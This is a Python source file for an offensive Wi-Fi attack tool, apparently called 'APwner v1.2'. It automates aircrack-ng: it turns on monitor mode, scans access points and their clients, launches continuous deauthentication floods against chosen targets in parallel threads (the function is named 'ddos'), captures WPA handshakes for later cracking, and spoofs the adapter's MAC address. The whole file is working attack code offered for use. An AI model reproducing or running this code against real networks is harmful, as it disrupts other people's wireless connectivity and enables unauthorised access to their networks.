import subprocess
import glob
import os.path
import re
import csv
import sys
import psutil
import threading
from prettytable import PrettyTable
from mods.colors import *

def aireplay():
    print(color.BLUE+"[+] Deauthenticating "+bssid+" on channel "+channel+"...")
    cmd = subprocess.run(['xterm', '-geometry', '110x24+0+0', '-hold', '-e', 'aireplay-ng', '-0', '0', '-a', bssid, interface])
    

def check_kill():
    print(color.BLUE+"[+] Killing conflicting processes..."+color.END)
    cmd = subprocess.run(['airmon-ng', 'check' ,'kill'], capture_output=True).stdout.decode()

def NetworkManager():
    print(color.BLUE+"[+] Restarting conflicting processes..."+color.END)
    subprocess.run(['systemctl', 'start', 'NetworkManager'])

def airodump():
    print(color.BLUE+"[+] Scanning for Access Points..."+color.END)
    subprocess.run(['mkdir', '-p', 'dumps'])
    subprocess.run(['xterm', '-geometry', '110x48-0+0', '-hold', '-e', 'airodump-ng', '-w' , 'dumps/dump', '--output-format', 'csv', interface])

def read_dump():
    global bssid, essid, channel, AP_dict, c, nwst_file
    AP_dict = {}
    c = 1
    nwst_file = max(glob.glob('dumps/*.csv'), key=os.path.getctime)
    with open(nwst_file, 'r') as csvfile:
        dump_file = csv.reader(csvfile)
        print("Available access points:\n")
        airo_table = PrettyTable()
        airo_table.field_names = ["", "ESSID", "BSSID", "CH", "ENCR", "PWR", "Stations"]
        for row in dump_file:
            if len(row) != 0:
                rep = 0
                if row[0] == "BSSID":
                    pass
                elif row[0] == "Station MAC":
                    break
                else:
                    bssid = row[0].strip()
                    with open(nwst_file, 'r') as csvfile:
                        dump_file = csv.reader(csvfile)
                        for rowb in dump_file:
                            if len(rowb) != 0 and rowb[5].strip() == bssid:
                                rep+=1
                    if not len(row[13].strip()) > 0:
                        essid = "<length:  0>"
                    else:
                        essid = row[13].strip()
                    if not len(row[5].strip()) > 0:
                        enc = "-"*4
                    else:
                        enc = row[5].strip()
                        channel = row[3].strip()
                    pwr = row[8].strip()
                    AP_dict.update({c:row[0]})
                    if int(row[8].strip()) > -50 and int(row[8].strip()) != -1:
                        pwr = color.GREEN+pwr+color.END
                    elif int(row[8].strip()) > -68 and int(row[8].strip()) < -50 and int(row[8].strip()) != -1:
                        pwr = color.YELLOW+pwr+color.END
                    else:
                        pwr = color.RED+pwr+color.END
                    if rep == 0:
                        str_rep = color.RED+str(rep)+color.END
                    elif rep == 1:
                        str_rep = color.YELLOW+str(rep)+color.END
                    else:
                        str_rep = color.GREEN+str(rep)+color.END
                    airo_table.add_row([str(c), essid, bssid, channel, enc, pwr, str_rep])
                    c+=1
        airo_table.align = "c"
        airo_table.align["ESSID"] = "l"
        airo_table.align["CH"] = "r"
        print(airo_table)
    print("\n[R] : "+"ReScan Access Points")
    print("[I] : "+"Rechoose interface")
    print("[*] : "+"Exit")
    AP_ch = input("\nAPs to target: ")
    if AP_ch == "R":
        airodump()
        read_dump()  
    elif AP_ch == "I":
        get_interface()
        airodump()
        read_dump()   
    else:
        AP = AP_dict[int(AP_ch)]
        with open(nwst_file, 'r') as csvfile:
            dump_file = csv.reader(csvfile)
            for row in dump_file:
                if len(row) < 1:
                    pass
                elif row[0] == "BSSID":
                    pass
                elif row[0] == "Station MAC":
                    break
                elif row[0] == AP:
                    bssid = row[0].strip()
                    channel = row[3].strip()
                    essid = row[13].strip()

def airmon():
    print(color.BLUE+"\n[+] Enabling Monitor mode on "+str(interface)+"..."+color.END)
    cmd = subprocess.run(['airmon-ng', 'start', interface, channel], capture_output=True).stdout.decode()
    print(cmd)

def get_interface():
    global interface, i
    i = 1
    int_dict = {}
    interfaces = psutil.net_if_addrs()
    int_table = PrettyTable()
    int_table.field_names = ["", "Name", "BSSID", "Manufacturer"]
    for item in interfaces.keys():
        if item != 'lo' and item != 'eth0' and item != 'vmnet1' and item != 'vmnet8' and item != 'vboxnet0' and item != 'vmnet0' and item != 'docker0':
            cmd = "macchanger -s "+item+" | grep -oP '(?<=Permanent MAC: ).*'"
            int_bssid = subprocess.check_output(cmd, shell=True).decode().strip()[:17]
            int_manu = re.sub("[()]","", subprocess.check_output(cmd, shell=True).decode().strip()[18:])
            int_dict.update({i: item})
            int_table.add_row([str(i), item, str(int_bssid), str(int_manu)])
            i+=1
    int_table.align = "c"
    int_table.align["Name"] = "l"
    int_table.align["Manufacturer"] = "l"
    print(int_table)
    print("\n[R] : "+"Rescan interfaces")
    print("[*] : "+"Exit")
    try:
        int_ch = input("\nInterface: ")
        if int_ch == "R":
            get_interface()
        else:
            print("")
            interface = int_dict[int(int_ch)]
    except:
        print("[-] Exiting due to Error or Interrupt...")
        sys.exit()

def handshake():
	if run == True:
		subprocess.run(['mkdir', '-p', 'handshakes/'+essid+'_'+bssid])
		subprocess.run(['xterm', '-geometry', '110x24-0+0', '-hold', '-e', 'airodump-ng', '--bssid', bssid, '-c', channel, '-w' , 'handshakes/'+essid+'_'+bssid+'/'+essid+'_'+bssid, interface])

def change_mac():
    print(color.BLUE+"[+] Bringing interface "+str(interface)+" down..."+color.END)
    subprocess.run(['ifconfig', interface ,'down'], capture_output=True).stdout.decode()
    print(color.BLUE+"[+] Changing MAC address..."+color.END)
    subprocess.run(['macchanger', '-A' , interface])
    print(color.BLUE+"[+] Bringing interface "+str(interface)+" up..."+color.END)
    subprocess.run(['ifconfig', interface ,'up'], capture_output=True).stdout.decode()
    

def reset_mac():
    print(color.BLUE+"[+] Bringing interface "+str(interface)+" down..."+color.END)
    subprocess.run(['ifconfig', interface ,'down'], capture_output=True).stdout.decode()
    print(color.BLUE+"[+] Restoring MAC address..."+color.END)
    cmd = subprocess.run(['macchanger', '-p' , interface], capture_output=True).stdout.decode()
    print(cmd.strip())
    print(color.BLUE+"[+] Bringing interface "+str(interface)+" up..."+color.END)
    subprocess.run(['ifconfig', interface ,'up'], capture_output=True).stdout.decode()

def read_dump_s():
    global s, station_ch, station_dict
    station_dict = {0:"All"}
    s = 0
    print(color.BLUE+"[+] Scanning for stations on "+ bssid+"..."+color.END)
    subprocess.run(['xterm', '-geometry', '110x48-0+0', '-hold', '-e', 'airodump-ng', '--bssid', bssid, '-w' , 'dumps/'+bssid, '--output-format', 'csv', '-c', channel, interface])
    nwst_file = max(glob.glob('dumps/*.csv'), key=os.path.getctime)
    with open(nwst_file, 'r') as csvfile:
        dump_file = csv.reader(csvfile)
        print("\nStations Detected:\n")
        s+=1
        stations_table = PrettyTable()
        stations_table.field_names = ["", "Station"]
        for row in dump_file:
            try:
                if row[5].strip() == bssid :
                    station_dict.update({s:row[0]})
                    print("\t{:5s} {:30s}".format(str(s), row[0].strip()))
                    stations_table.add_row([str(s), row[0].strip()])
                    s+=1
            except:
                pass
        print(stations_table)
    print("\n[0] : "+"All")
    print("[R] : "+"ReScan Stations")
    print("[A] : "+"ReScan Access Points")
    print("[I] : "+"Rechoose interface")
    print("[*] : "+"Exit")
    station_ch = input("\nStations to target: ")
    if station_ch == "R":
        read_dump_s()
    elif station_ch == "A":
        airodump()
        read_dump()
        read_dump_s()
    elif station_ch == "I":
        get_interface()
        airodump()
        read_dump()
        read_dump_s()

def aireplay_s(st_input):
    subprocess.run(['xterm', '-geometry', '110x24+0+0', '-hold', '-e', 'aireplay-ng', '-0', '0', '-a', bssid, '-c', station_dict[int(st_input)], interface])

def ddos():
    global run, found
    run = False
    found = False
    threads = []
    if len(station_ch) > 0 :
        for x in station_ch.split():
            if x == '0':
                found = True
        if found == True:
            run = True
            aireplay()
        else:
            run = True
            for x in station_ch.split():
                print(color.BLUE+"[+] Deauthenticating "+station_dict[int(x)]+ " connected to "+bssid+" on channel "+channel+"..."+color.END)
            for x in station_ch.split():
                t = threading.Thread(target=aireplay_s, args=(x,))
                threads.append(t)
            for i in threads:
                i.start()
            for i in threads:
                i.join()
    else:
        print(color.RED+"\n[-] No stations selected"+color.END+"\nExiting...")
        sys.exit()



banner = '''
    _     ____
   / \   |  _ \ __      __ _ __    ___  _ __
  / _ \  | |_) |\ \ /\ / /| '_ \  / _ \| '__|
 / ___ \ |  __/  \ V  V / | | | ||  __/| |
/_/   \_\|_|      \_/\_/  |_| |_| \___||_|  v1.2
                by kod34
'''
